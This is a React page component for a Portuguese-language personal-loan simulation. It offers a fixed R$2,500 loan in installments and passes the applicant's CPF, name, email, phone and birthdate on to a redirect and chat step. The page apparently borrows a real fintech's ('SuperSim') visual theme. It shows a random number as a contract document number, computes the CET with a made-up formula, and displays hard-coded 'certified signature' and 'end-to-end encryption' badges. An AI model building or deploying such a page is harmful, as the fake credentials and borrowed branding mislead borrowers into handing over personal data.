import { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { useTransitionNavigate } from "@/components/PageTransition";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { ArrowLeft, FileText, Shield, CheckCircle2, Calendar, Percent, Banknote, Clock, ChevronRight } from "lucide-react";

const loanAmount = 2500;

const installmentOptions = [
  { parcelas: 6, taxa: 1.32 },
  { parcelas: 12, taxa: 1.32 },
  { parcelas: 18, taxa: 1.32 },
  { parcelas: 24, taxa: 1.32 },
  { parcelas: 30, taxa: 1.32 },
  { parcelas: 36, taxa: 1.32 },
  { parcelas: 48, taxa: 1.32 },
];

const calcParcela = (valor: number, parcelas: number, taxaMensal: number) => {
  const i = taxaMensal / 100;
  const pmt = valor * (i * Math.pow(1 + i, parcelas)) / (Math.pow(1 + i, parcelas) - 1);
  return pmt;
};

const formatCurrency = (v: number) =>
  v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const today = new Date().toLocaleDateString("pt-BR");

const Simulacao = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const transitionNavigate = useTransitionNavigate();
  const routeState = (location.state as any) || {};
  const storedCadastroState = (() => {
    if (typeof window === "undefined") return {} as Record<string, any>;
    try {
      return JSON.parse(sessionStorage.getItem("cadastroState") || "{}");
    } catch {
      return {} as Record<string, any>;
    }
  })();
  const cpfData = routeState.cpfData ?? storedCadastroState.cpfData;
  const cpfDigits = routeState.cpfDigits ?? storedCadastroState.cpfDigits;
  const cadastro = routeState.cadastro ?? storedCadastroState.cadastro;
  const [selected, setSelected] = useState(1);

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.setItem(
        "cadastroState",
        JSON.stringify({
          cpfData,
          cpfDigits,
          cadastro,
        })
      );
    }
  }, [cadastro, cpfData, cpfDigits]);

  const handleConfirm = () => {
    const opt = installmentOptions[selected];
    const valorParcela = calcParcela(loanAmount, opt.parcelas, opt.taxa);
    const formattedCpf = cpfDigits
      ? cpfDigits.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
      : cpfData?.cpf || cpfData?.cpf_numero || "";

    const nextState = {
      initialMessage: `Olá! Quero solicitar meu empréstimo de ${formatCurrency(loanAmount)} em ${opt.parcelas}x de ${formatCurrency(valorParcela)}. Nome: ${cadastro?.nomeCompleto || "N/A"}. Dia de pagamento: ${cadastro?.diaPagamento || "N/A"}.`,
      nome: cadastro?.nomeCompleto,
      cpf: formattedCpf,
      email: cadastro?.email || "",
      celular: cadastro?.celular || "",
      dataNascimento: cpfData?.data_nascimento || cpfData?.dataNascimento || "",
      loanDetails: {
        valor: loanAmount,
        parcelas: opt.parcelas,
        valorParcela,
        taxa: opt.taxa,
        diaPagamento: cadastro?.diaPagamento || "N/A",
      },
    };

    sessionStorage.setItem("chatState", JSON.stringify(nextState));
    sessionStorage.setItem("cadastroState", JSON.stringify({ cpfData, cpfDigits, cadastro }));
    transitionNavigate("/redirecionando", nextState);
  };

  const selectedOpt = installmentOptions[selected];
  const selectedParcela = calcParcela(loanAmount, selectedOpt.parcelas, selectedOpt.taxa);
  const selectedTotal = selectedParcela * selectedOpt.parcelas;
  const cet = (selectedOpt.taxa * 12 + 2.5).toFixed(2);

  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f7]">
      {/* Header */}
      <Header />

      <main className="flex-1 flex flex-col items-center px-4 py-6">
        <div className="w-full max-w-lg">
          <button
            onClick={() => navigate(-1)}
            className="flex items-center gap-1.5 text-sm text-gray-500 hover:text-gray-800 transition-colors group mb-4"
          >
            <ArrowLeft className="w-4 h-4 group-hover:-translate-x-0.5 transition-transform" />
            Voltar
          </button>

          {/* Contract Document */}
          <div className="bg-white rounded-xl shadow-lg border border-gray-200 overflow-hidden">
            
            {/* Document Header - Cores do tema SuperSim */}
            <div className="bg-sunburst px-6 py-5 relative">
              <div className="relative z-10 flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-white/20 backdrop-blur-sm flex items-center justify-center border border-white/30">
                  <FileText className="w-5 h-5 text-white" />
                </div>
                <div>
                  <h1 className="text-lg font-bold text-white tracking-tight drop-shadow-sm">
                    Proposta de Crédito Pessoal
                  </h1>
                  <p className="text-xs text-white/80 mt-0.5">
                    Documento nº {Math.floor(Math.random() * 900000 + 100000)} · {today}
                  </p>
                </div>
              </div>
            </div>

            {/* Security Badge - Ajustado para tons laranja */}
            <div className="bg-primary/10 border-b border-primary/20 px-6 py-2.5 flex items-center gap-2">
              <Shield className="w-3.5 h-3.5 text-primary" />
              <span className="text-[11px] text-primary font-medium">
                Documento protegido · Assinatura eletrônica certificada
              </span>
            </div>

            {/* Valor Principal */}
            <div className="px-6 py-6 border-b border-gray-100">
              <p className="text-xs text-muted-foreground uppercase tracking-widest font-semibold mb-1">Valor do crédito</p>
              <p className="text-4xl font-black text-gray-900 tracking-tight">
                {formatCurrency(loanAmount)}
              </p>
              <div className="flex items-center gap-4 mt-3">
                <div className="flex items-center gap-1.5 text-xs text-muted-foreground">
                  <Percent className="w-3 h-3" />
                  <span>Taxa: {selectedOpt.taxa}% a.m.</span>
                </div>
                <div className="flex items-center gap-1.5 text-xs text-muted-foreground">
                  <Clock className="w-3 h-3" />
                  <span>CET: {cet}% a.a.</span>
                </div>
              </div>
            </div>

            {/* Parcelamento - Cards com seleção laranja */}
            <div className="px-6 py-5 border-b border-gray-100">
              <p className="text-xs text-muted-foreground uppercase tracking-widest font-semibold mb-4">
                Selecione o parcelamento
              </p>
              <div className="space-y-2">
                {installmentOptions.map((opt, idx) => {
                  const valorParcela = calcParcela(loanAmount, opt.parcelas, opt.taxa);
                  const totalPago = valorParcela * opt.parcelas;
                  const isSelected = selected === idx;
                  return (
                    <button
                      key={idx}
                      type="button"
                      onClick={() => setSelected(idx)}
                      className={`w-full px-4 py-3.5 rounded-lg border text-left transition-all duration-200 ${
                        isSelected
                          ? "border-primary bg-primary/5 shadow-md"
                          : "border-gray-200 bg-white hover:border-primary/50 hover:bg-gray-50"
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center shrink-0 transition-colors ${
                            isSelected ? "border-primary" : "border-gray-300"
                          }`}>
                            {isSelected && <div className="w-2 h-2 rounded-full bg-primary" />}
                          </div>
                          <div>
                            <p className={`text-base font-bold ${isSelected ? "text-gray-900" : "text-gray-900"}`}>
                              {opt.parcelas}x de {formatCurrency(valorParcela)}
                            </p>
                            <p className={`text-xs mt-0.5 ${isSelected ? "text-primary font-medium" : "text-muted-foreground"}`}>
                              Total: {formatCurrency(totalPago)}
                            </p>
                          </div>
                        </div>
                        {isSelected && (
                          <CheckCircle2 className="w-5 h-5 text-primary shrink-0" />
                        )}
                      </div>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Resumo Contratual */}
            <div className="px-6 py-5 border-b border-gray-100">
              <p className="text-xs text-muted-foreground uppercase tracking-widest font-semibold mb-4">
                Resumo da operação
              </p>
              <div className="space-y-3">
                <div className="flex items-center justify-between py-2 border-b border-dashed border-gray-200">
                  <div className="flex items-center gap-2">
                    <Banknote className="w-4 h-4 text-muted-foreground" />
                    <span className="text-sm text-gray-600">Valor solicitado</span>
                  </div>
                  <span className="text-sm font-bold text-gray-900">{formatCurrency(loanAmount)}</span>
                </div>
                <div className="flex items-center justify-between py-2 border-b border-dashed border-gray-200">
                  <div className="flex items-center gap-2">
                    <Calendar className="w-4 h-4 text-muted-foreground" />
                    <span className="text-sm text-gray-600">Parcelas</span>
                  </div>
                  <span className="text-sm font-bold text-gray-900">
                    {selectedOpt.parcelas}x de {formatCurrency(selectedParcela)}
                  </span>
                </div>
                <div className="flex items-center justify-between py-2 border-b border-dashed border-gray-200">
                  <div className="flex items-center gap-2">
                    <Percent className="w-4 h-4 text-muted-foreground" />
                    <span className="text-sm text-gray-600">Taxa de juros</span>
                  </div>
                  <span className="text-sm font-bold text-gray-900">{selectedOpt.taxa}% a.m.</span>
                </div>
                <div className="flex items-center justify-between py-2 border-b border-dashed border-gray-200">
                  <div className="flex items-center gap-2">
                    <Percent className="w-4 h-4 text-muted-foreground" />
                    <span className="text-sm text-gray-600">CET (Custo Efetivo Total)</span>
                  </div>
                  <span className="text-sm font-bold text-gray-900">{cet}% a.a.</span>
                </div>
                <div className="flex items-center justify-between py-2">
                  <div className="flex items-center gap-2">
                    <Banknote className="w-4 h-4 text-muted-foreground" />
                    <span className="text-sm text-gray-600">Total a pagar</span>
                  </div>
                  <span className="text-sm font-extrabold text-gray-900">{formatCurrency(selectedTotal)}</span>
                </div>
                {cadastro?.diaPagamento && (
                  <div className="flex items-center justify-between py-2 border-t border-dashed border-gray-200">
                    <div className="flex items-center gap-2">
                      <Calendar className="w-4 h-4 text-muted-foreground" />
                      <span className="text-sm text-gray-600">Dia de vencimento</span>
                    </div>
                    <span className="text-sm font-bold text-gray-900">Dia {cadastro.diaPagamento}</span>
                  </div>
                )}
              </div>
            </div>

            {/* Legal disclaimer */}
            <div className="px-6 py-4 bg-gray-50 border-b border-gray-100">
              <p className="text-[10px] leading-relaxed text-gray-400">
                Ao prosseguir, você declara estar ciente e de acordo com os termos e condições 
                da proposta de crédito pessoal, incluindo taxas, encargos e prazos descritos acima. 
                A contratação está sujeita à análise e aprovação de crédito. Operação regulamentada 
                pelo Banco Central do Brasil conforme Resolução nº 4.949/2021.
              </p>
            </div>

            {/* CTA - Botão 3D laranja */}
            <div className="px-6 py-5">
              <button
                onClick={handleConfirm}
                className="w-full btn-3d flex items-center justify-center gap-2"
              >
                <span>Aceitar e prosseguir</span>
                <ChevronRight className="w-5 h-5" />
              </button>
              <p className="text-center text-[10px] text-gray-400 mt-3 flex items-center justify-center gap-1">
                <Shield className="w-3 h-3" />
                Seus dados estão protegidos com criptografia de ponta a ponta
              </p>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default Simulacao;
